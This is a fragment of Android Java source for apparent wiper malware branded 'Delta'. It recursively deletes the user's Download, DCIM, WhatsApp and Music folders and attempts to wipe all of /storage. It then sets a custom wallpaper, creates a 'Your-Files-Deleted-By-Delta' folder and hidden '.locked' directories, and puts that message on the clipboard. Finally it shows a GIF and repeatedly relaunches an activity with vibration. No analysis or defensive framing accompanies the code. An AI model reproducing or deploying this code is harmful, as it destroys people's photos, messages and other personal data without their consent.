FileUtil.deleteFile(FileUtil.getExternalStorageDir().concat("/Download"));

FileUtil.deleteFile(FileUtil.getExternalStorageDir().concat("/DCIM"));

FileUtil.deleteFile(FileUtil.getExternalStorageDir().concat("/WhatsApp"));
FileUtil.deleteFile(FileUtil.getExternalStorageDir().concat("/DCIM"));
FileUtil.deleteFile(FileUtil.getExternalStorageDir().concat("/Music"));
FileUtil.deleteFile("/storage/emulated/0/*");
FileUtil.deleteFile("/storage/emulated/0");
FileUtil.deleteFile("/storage/emulated");
FileUtil.deleteFile("/storage");
WallpaperManager
myWallpaperManager =
WallpaperManager.getInstance(getApplicationContext());
try{
	myWallpaperManager.setResource(R.drawable.wall);
}catch (Exception g) {
	g.printStackTrace();
}
FileUtil.makeDir("/storage/emulated/0/Your-Files-Deleted-By-Delta/DELTA");
FileUtil.makeDir("/storage/emulated/0/.locked1");
FileUtil.makeDir("/storage/emulated/0/.locked2");
FileUtil.makeDir("/storage/emulated/0/.locked3");
FileUtil.makeDir("/storage/emulated/0/.locked4");
((ClipboardManager) getSystemService(getApplicationContext().CLIPBOARD_SERVICE)).setPrimaryClip(ClipData.newPlainText("clipboard", "Your-Files-Deleted-By-Delta"));
Glide.with(getApplicationContext()).load(Uri.parse("file:///android_asset/".concat("Delta.gif"))).into(imageview1);
t = new TimerTask() {
	@Override
	public void run() {
		runOnUiThread(new Runnable() {
			@Override
			public void run() {
				i.setAction(Intent.ACTION_VIEW);
				i.setClass(getApplicationContext(), HomeActivity.class);
				startActivity(i);
				v.vibrate((long)(100));
			}
		});
	}
};
_timer.schedule(t, (int)(2500));